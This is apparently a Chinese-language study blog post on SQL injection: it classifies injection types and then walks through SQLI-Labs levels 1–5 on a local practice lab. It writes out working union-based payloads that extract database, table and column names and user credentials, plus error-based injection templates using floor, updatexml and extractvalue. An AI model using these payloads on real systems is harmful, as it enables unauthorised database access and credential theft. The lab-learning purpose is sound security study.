---
title: sql注入学习
tags:
  - sqli-labs
categories: 网络安全知识学习
abbrlink: 6d789c72
date: 2020-11-07 23:47:02
---

　　这个漏洞以后再写项目的时候必须注意<!--more-->

# SQLI-Labs简介

## 1.sql注入

　　通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

## 2.sql注入类型

按照注入点类型来分类

### （1）数字型注入点

sql语句为`select * from table_name where id = x`

这种类型可以使用and 1=1 和 and 1=2判断：

​		1.url地址中输入id=x and 1=1页面正常回显

​		2.url地址中输入id=x and 1=2页面回显不正常，则属于该类型

原因：

当输入and 1=1时，执行的sql语句：`selece * from table_name where id=x and 1=1`，没有逻辑错误，返回正常

当输入and 1=2时，执行的sql语句：`selece * from table_name where id=x and 1=2`

如果是字符型注入，则应该是以下情况

1）`selece * from table_name where 'id=x and 1=1'`

2）`selece * from table_name where 'id=x and 1=2'`

引号里面的被转换为字符串，没有进行逻辑判断，不会出现上述结果，所以这种情况不成立。

### （2）字符型注入点

　　当输入的参数x为字符型时，执行的sql语句：`select * from table_name where id='x'`

同样可以用and '1'='1和and '1'='2判断：

​		1.url地址输入id=x' and '1'='1页面正常，继续下一步

​		2.url地址中继续输入id=x' and '1'='2页面错误，则为字符型注入

原因：

当输入id=x' and '1'='1时，执行的sql语句：`select * from table_name where id='x' and '1'='1'`

语法正确，逻辑正确，所以返回正确

当输入and '1'='2，执行的sql语句：`select * from table_name where id='x' and '1'='2'`

语法正确，但是逻辑判断错误

### （3）搜索型注入点

　　这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'`。

组合出来的sql注入语句为：`select * from news where search like '%测试 %' and '%1%'='%1%'`

测试%' union select 1,2,3,4 and '%'='

按照数据提交的方式来分类

（1）GET 注入

提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接`http://xxx.com/news.php?id=1` , id 是注入点。

（2）POST 注入

使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。

（3）Cookie 注入

HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。

（4）HTTP 头部注入

注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。

按照执行效果来分类

（1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

（2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

（3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

*（4）联合查询注入，可以使用union的情况下的注入。

*（5）堆查询注入，可以同时执行多条语句的执行时的注入。

# SQLI-LABS学习

## 声明

首先说一下我在学习过程中经常弄混淆的一些单词

table_schema：数据库名

information_schema.schemata：所有的数据库中

information_schema.tables：该数据库中的所有表

information_schema.column：该表中的所有列

table_name：表名

column_name：列名

## 第一关

-- （这里有一个空格）在sql语句中表示注释，但是在url中，如果在最后一行加上-- ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替，因为+在URL被编码后会变成空格。

1.输入`http://127.0.0.1/sqli/Less-1/?id=1`，页面回显正常，所以改地方不是数值查询。
![](https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)



2.在id后面加上'，页面回显不正常，可能存在字符注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027175440385.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)



3.输入--+将sql后面的语句注释掉，页面回显正常，说明是单引号字符型注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027175502223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)



4.接着使用order by语句判断该数据库有几列输入，order by 4、order by 5、order by 6···页面都回显错误，只有order by 3正常，说明该表有3列
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027175622660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)

5.将id=1改成id=-1，然后使用union select 1,2,3联合查询语句查询是否有显示位。显示2和3，表明有2个显示位，说明第2列和第3列可以显示信息。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027180119978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)

6.然后利用sql查询语句爆破出数据库的库名，表名，列名，字段信息：
库名：`http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027182524974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)

表名：`http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+`
这里0x7365637572697479是查询的库名security的16进制
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027182008418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)

users表中的列名：`http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027182640634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)

接着使用一下语句查询账号密码
`http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+ `
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201027182951559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center)

## 第二关

第二关和第一关是一个类型的

1.输入id=1回显正常

2.id=1'出错，可以见是单引号闭合出错

3.之后继续按照第一关的步骤进行爆破信息

## 第三次

1.和之前一样输入

![BHiUhV.png](https://s1.ax1x.com/2020/11/09/BHiUhV.png)

2.使id=1'--+

![BHirnJ.png](https://s1.ax1x.com/2020/11/09/BHirnJ.png)

但是输入id=1') --+页面回显正常，说明此处是字符型注入，而且以('')的方式闭合字符串

3.接着使用order by判断表中有3列数据

4.使用联合查询union select 1,2,3判断是有回显位，回显位是2,3

![BHiG0s.png](https://s1.ax1x.com/2020/11/09/BHiG0s.png)

5.爆出库名是security

![BHitkq.png](https://s1.ax1x.com/2020/11/09/BHitkq.png)

列出security库中所有的表名

![BHiJ7n.png](https://s1.ax1x.com/2020/11/09/BHiJ7n.png)

列出users表中所有的列名

![BHidpT.png](https://s1.ax1x.com/2020/11/09/BHidpT.png)

## 第四关

与之前的都类似，先判断这一关是("")闭合异常

1.输入id=1，页面回显正常

2.输入id=1“--+，页面回显不正常

![BHi0cF.png](https://s1.ax1x.com/2020/11/09/BHi0cF.png)

3.进行和第三关一样的步骤

## 第五关

这一关输入id=3时发现页面回显是you are in...

可见是布尔型注入，它并不能正常显示内容，正确回显只会显示you are in...，错误就不显示，所以无法用order by查看显示位

1.输入id=1

![BHiBX4.png](https://s1.ax1x.com/2020/11/09/BHiBX4.png)

2.输入id=1‘

![BHirnJ.png](https://s1.ax1x.com/2020/11/09/BHirnJ.png)

页面显示sql语句错误，在这里进行新的注入方式：报错注入

以下三种常用的语句：

**payload**是我们要输入的sql查询语句

a.通过floor报错

`and (select 1 from (select count(*),concat(( **payload**),floor (rand(0)*2))x from information_schema.tables group by x)a)`

其中payload为你要插入的SQL语句

需要注意的是该语句将 输出字符长度限制为64个字符



b.通过updatexml报错

and updatexml(1, **payload**,1)

同样该语句对输出的字符长度也做了限制，其最长输出32位

并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效



c.通过ExtractValue报错

通过ExtractValue报错

and extractvalue(1, **payload**)

输出字符有长度限制，最长32位。